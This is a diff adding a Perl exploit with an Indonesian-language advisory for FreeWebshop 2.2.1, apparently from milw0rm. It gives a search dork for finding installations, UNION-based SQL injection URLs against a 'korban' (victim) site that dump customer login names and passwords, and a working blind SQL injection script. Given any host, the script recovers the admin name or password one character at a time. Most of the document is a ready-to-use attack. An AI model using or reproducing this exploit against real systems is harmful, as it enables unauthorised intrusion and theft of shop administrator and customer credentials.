@@ -1,0 +1,137 @@
+#!/usr/bin/perl
+#
+# Indonesian Newhack Security Advisory
+# ------------------------------------
+# FreeWebshop version 2.2.1 - Multiple Remote SQL Injection Vulnerabilities
+# Waktu			:  Dec 16 2007 01:50AM
+# Software		:  FreeWebshop version 2.2.1
+# Vendor		:  http://www.freewebshop.org/
+# Demo Site		:  http://www.freewebshop.org/demo/
+# Ditemukan oleh	:  k1tk4t  |  http://newhack.org
+# Lokasi		:  Indonesia
+# Dork			:  "Powered by FreeWebshop.org 2.2.1"
+#
+#
+# - variable "prod" pada "detail" tidak terfilter dengan baik sebelumnya sehingga user dapat memanipulasi sql query melalui browser secara remote
+# ;
+# http://korban.site/index.php?page=details&prod=[SQLI]&cat=0&group=0
+#
+# - variable "cat" pada "list" tidak terfilter dengan baik sebelumnya sehingga user dapat memanipulasi sql query melalui browser secara remote
+# ;
+# http://korban.site/index.php?page=browse&action=list&group=0&cat=[SQLI]&orderby=DESCRIPTION
+#
+# - variable "group" pada berkas "index.php" tidak terfilter dengan baik sebelumnya sehingga user dapat memanipulasi sql query melalui browser secara remote
+# ;
+# http://korban.site/index.php?group=[Blind SQLI]&page=categories
+#
+# Contoh [SQLI] ;
+# http://korban.site/index.php?page=browse&action=list&group=0&cat=-1/**/UNION/**/SELECT/**/null,concat(loginname,0x3a,password),null/**/from/**/customer/**/limit/**/0,1/*&orderby=DESCRIPTION
+#
+#
+# Terima Kasih untuk;
+# -[opt1lc, fl3xu5, ghoz]-
+# str0ke, DNX, xoron, cyb3rh3b, K-159, the_hydra, y3dips
+# nyubi,iFX,sin~X,kin9k0ng,bius,selikoer,aldy_BT
+# Komunitas Security dan Hacker Indonesia
+#
+#
+# ----------------------------[Blind SQLI]------------------------------------
+use LWP::UserAgent;
+use Getopt::Long;
+
+if(!$ARGV[1])
+{
+ print "\n  |-------------------------------------------------|";
+ print "\n  |         Indonesian Newhack Technology           |";
+ print "\n  |-------------------------------------------------|";
+ print "\n  |  MOG-WebShop => ? (group) Blind SQL Injection   |";
+ print "\n  |     Found by k1tk4t [k1tk4t(at)newhack.org]     |";
+ print "\n  |   DNX Code [dnx(at)hackermail.com] | Modified   |";
+ print "\n  |-------------------------------------------------|";
+ print "\n[!] ";
+ print "\n[!] Kutu pada index.php dengan variable (group) yang dapat dimanipulasi secara Blind SQLI";
+ print "\n[!] Penggunaan : perl freewebshop211.pl [Host] [Path] ";
+ print "\n[!] Contoh     : perl freewebshop211.pl 127.0.0.1 /WebShop/ -c 2 -o 1";
+ print "\n[!] Options:";
+ print "\n       -c [no]       nilai sebenarnya dari group pada index.php, default 1";
+ print "\n       -o [no]       1 = admin name (default)";
+ print "\n                     2 = admin password";
+ print "\n       -p [ip:port]  Proxy support";
+ print "\n";
+ exit;
+}
+
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my $cat     = 1;
+my $column  = "loginname";
+my %options = ();
+GetOptions(\%options, "c=i", "o=i", "p=s");
+
+print "[!] Exploiting...\n";
+
+if($options{"c"}) { $cat = $options{"c"}; }
+if($options{"o"} && $options{"o"} == 2) { $column = "password"; }
+
+syswrite(STDOUT, "[!] Data : ", 12);
+
+for(my $i = 1; $i <= 32; $i++)
+{
+ my $found = 0;
+ my $h = 48;
+ while(!$found && $h <= 57)
+ {
+   if(istrue2($host, $path, $i, $h))
+   {
+     $found = 1;
+     syswrite(STDOUT, chr($h), 1);
+   }
+   $h++;
+ }
+ if(!$found)
+ {
+   $h = 97;
+   while(!$found && $h <= 122)
+   {
+     if(istrue2($host, $path, $i, $h))
+     {
+       $found = 1;
+       syswrite(STDOUT, chr($h), 1);
+     }
+     $h++;
+   }
+ }
+}
+
+print "\n[!] Exploit done\n";
+
+sub istrue2
+{
+ my $host  = shift;
+ my $path  = shift;
+ my $i     = shift;
+ my $h     = shift;
+
+ my $ua = LWP::UserAgent->new;
+ my $url = "http://".$host.$path."index.php?group=".$cat."%20AND%20SUBSTRING((SELECT%20".$column."%20FROM%20customer%20LIMIT%200,1),".$i.",1)=CHAR(".$h.")&page=categories";
+
+ if($options{"p"})
+ {
+   $ua->proxy('http', "http://".$options{"p"});
+ }
+
+ my $response = $ua->get($url);
+ my $content = $response->content;
+ my $regexp = "cat.gif";
+
+ if($content =~ /$regexp/)
+ {
+   return 1;
+ }
+ else
+ {
+   return 0;
+ }
+}
+
+# milw0rm.com [2007-12-18]
